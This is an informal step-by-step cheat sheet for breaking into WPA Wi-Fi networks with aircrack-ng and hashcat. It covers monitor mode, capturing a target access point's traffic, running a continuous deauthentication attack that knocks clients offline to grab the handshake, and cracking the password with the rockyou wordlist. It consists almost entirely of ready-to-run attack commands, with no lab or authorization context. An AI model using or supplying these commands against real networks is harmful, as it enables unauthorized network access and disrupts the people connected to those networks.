1) To view interface
"airmon-ng"

2) To start monitor mode
"airmon-ng start (interface name)"
ex:"airmon-ng start wlan0"
not an actual step but it shows you that some proccesses have to be kill 
so this may be skipped

3) kill all unnessesary services
Ex: "kill 2729 2854 3436 3564"
better method
Ex: airmon-ng check kill

4) to view wireless traffic
"airodump-ng (interface)"
Ex: "airodump-ng wlan0"

5) airodump-ng -c (channel) -w (name of save file) --bssid (wifi bssid) (interface)
Ex: airodump-ng -c 6 -w test --bssid 14:D6:4D:25:96:A8 mon0

6) open new terminal

7)deathenticate a client
"aireplay-ng -0 0 -a (bssid) (interface)"
Ex: " aireplay-ng -0 0 -a 14:D6:4D:25:96:A8 mon0"

8) View files created from commands
"ls"

9) only file needed is "name of file.cap"
Ex: "test.cap"

10 To crack with aircrack (skip to 11 to crack with hascat)
"aircrack-ng -w (name of wordlist) (name of file trying to crack)
Ex: aircrack-ng -w /usr/share/wordlists/rockyou.txt test-01.cap

11) To crack the file.cap with hashcat you must first clean it. Pay close attention to the in and out .cap settings
"wpaclean <out.cap> <in.cap>"
Ex: "wpaclean test.cap test-01.cap"

12) Next, Use capital J
"aircrack-ng <out.cap> -J <out.hccap>"
Ex: "aircrack-ng test.cap -J test"
It will automatically add the .hccap to your file

13)Use hashcat to brutefore or dictionary attack the file
Ex for dictionary: "hashcat -m 2500 -a 0 -o cracked.txt test.hccap /usr/share/wordlists/rockyou.txt
